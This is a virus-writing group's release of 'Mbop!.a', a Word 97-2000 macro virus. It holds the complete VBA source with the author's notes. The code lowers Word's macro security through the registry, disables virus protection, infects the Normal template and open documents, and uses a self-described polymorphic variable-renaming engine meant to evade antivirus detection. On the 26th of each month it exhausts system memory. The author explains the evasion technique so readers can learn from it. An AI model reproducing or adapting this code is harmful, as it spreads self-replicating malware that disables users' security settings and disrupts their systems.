Mbop!.a
Word97-2000 Macro Virus
By [K]Alamar
Member of Virii Argentina [http://www.virii.com.ar]
______________________________________________________________________
Mbop!:
First one whit:
	No defined macros
	No external files(exporting-importing)
	No defined names
	New Poly Engine
	New Infection method
	I think that it's all.

Payloads:
	Shows a message when it infects("Mbop!"
	In days 26 it creates variables of 1mb until system goes down
	of memory. If you close the document the memory return.
______________________________________________________________________
About the Poly engine:
	It's new stuff that i created.
	As you can see in the source code below, the word mbop is
	in all the variables, before and after he two letters that
	are the variable name.
	The trick is that the virii creates a random word of 15 char.
	and replace it all the times that is shown in the virii, so
	the virus changes really a lot, and some times more than 2 or 3
	times in the same line.
	I expect that the Av softwares are not going to be able to
	detect it, I HOPE; but if they detect it, i will made a
	new one, ;o).
______________________________________________________________________
You can see a little explanation at the end of this text.
______________________________________________________________________
Private Sub Document_Open()
On Error Resume Next
mbopl1mbop = "M"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Options.VirusProtection = False
Options.SaveNormalPrompt = False
mbopfimbop = 7
Options.ConfirmConversions = False
Set mbopNtmbop = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set mbopAdmbop = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set mbopTdmbop = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
mbopsembop = 5
mbopl2mbop = "b"
mbopfnmbop = mbopfimbop & mbopsembop
For mbopiimbop = 1 To mbopTdmbop.countoflines
If InStr(mbopTdmbop.lines(mbopiimbop, 1), "Private Sub Document_Open()") <> 0 Then
mbopSlmbop = mbopiimbop
Exit For
End If
Next
mbopl3mbop = "o"
mbopVcmbop = Trim(mbopTdmbop.lines(mbopSlmbop, mbopSlmbop + mbopfnmbop))
mboplvmbop = 97
If mbopNtmbop.countoflines > 0 Then
mbopNlmbop = mbopNtmbop.lines(1, mbopNtmbop.countoflines)
If InStr(mbopNlmbop, "Nt") = 0 And InStr(mbopNlmbop, "Sl") = 0 And InStr(mbopNlmbop, "Nl") = 0 And InStr(mbopNlmbop, "Ad") = 0 And InStr(mbopNlmbop, "Vc") = 0 And InStr(mbopNlmbop, "Td") = 0 Then
mbopNtmbop.addfromstring mbopVcmbop
mbopinmbop = True
End If
Else
mbopNtmbop.addfromstring mbopVcmbop
mbopinmbop = True
End If
mbophvmbop = 122
If mbopAdmbop.countoflines > 0 Then
mbopAlmbop = mbopAdmbop.lines(1, mbopAdmbop.countoflines)
If InStr(mbopAlmbop, "Nt") = 0 And InStr(mbopAlmbop, "Sl") = 0 And InStr(mbopAlmbop, "Nl") = 0 And InStr(mbopAlmbop, "Ad") = 0 And InStr(mbopAlmbop, "Vc") = 0 And InStr(mbopAlmbop, "Td") = 0 Then
mbopAdmbop.addfromstring mbopVcmbop
mbopiambop = True
End If
Else
mbopAdmbop.addfromstring mbopVcmbop
mbopiambop = True
End If
mbopl4mbop = "p"
For mbopiimbop = 1 To 15
Randomize
mbopTnmbop = mbopTnmbop & Chr(Int((mbophvmbop - mboplvmbop + 1) * Rnd + mboplvmbop))
Next
mbopd2mbop = 9
mbopVcmbop = mbopTdmbop.lines(1, mbopTdmbop.countoflines)
mbopTdmbop.deletelines 1, mbopTdmbop.countoflines
Do While InStr(mbopVcmbop, "mbop") <> 0
mbopVcmbop = Mid(mbopVcmbop, 1, InStr(mbopVcmbop, "mbop") - 1) & mbopTnmbop & Mid(mbopVcmbop, InStr(mbopVcmbop, "mbop") + Len("mbop"))
Loop
mbopTdmbop.addfromstring mbopVcmbop
mbopDymbop = Day(Now)
mbopd1mbop = 2
mbopl5mbop = "!"
If mbopDymbop = mbopd1mbop & mbopd2mbop Then
Dim mbopstmbop()
mbopcambop = 0
Do
ReDim Preserve mbopstmbop(mbopcambop)
mbopqwmbop = CLng(1024)
mbopqambop = mbopqwmbop
mbopqzmbop = mbopqwmbop * mbopqambop
mbopstmbop(mbopcambop) = String(mbopqzmbop, Right(mbopTnmbop, 1))
DoEvents
mbopcambop = mbopcambop + 1
Loop
End If
If mbopiambop = True Or mbopinmbop = True Then
MsgBox mbopl1mbop & mbopl2mbop & mbopl3mbop & mbopl4mbop & mbopl5mbop, vbCritical
End If
End Sub
______________________________________________________________________



--------
The part of the code that creates the random word is:
-
For mbopiimbop = 1 To 15
Randomize
mbopTnmbop = mbopTnmbop & Chr(Int((mbophvmbop - mboplvmbop + 1) * Rnd + mboplvmbop))
Next
-
The "mbophvmbop" and "mboplvmbop" are the highest and the lower value,
cause the character is created by the asci code.(122-97)
--------
The part of the code that replace the variables is:
-
Do While InStr(mbopVcmbop, "mbop") <> 0
mbopVcmbop = Mid(mbopVcmbop, 1, InStr(mbopVcmbop, "mbop") - 1) & mbopTnmbop & Mid(mbopVcmbop, InStr(mbopVcmbop, "mbop") + Len("mbop"))
Loop
-
"mbopVcmbop" is the soruce code.
"mbopTnmbop" is the random word.
"mbop" is replaced whit the random word, so the next time, it will
look for this word.
--------
______________________________________________________________________
I hope you understood the code, and that you can learnt a lot of this
macro virus.

P.S.: Sorry for the bad english.
______________________________________________________________________
Mbop!.a
Word97-2000 Macro Virus
By [K]Alamar
Member of Virii Argentina [http://www.virii.com.ar]
______________________________________________________________________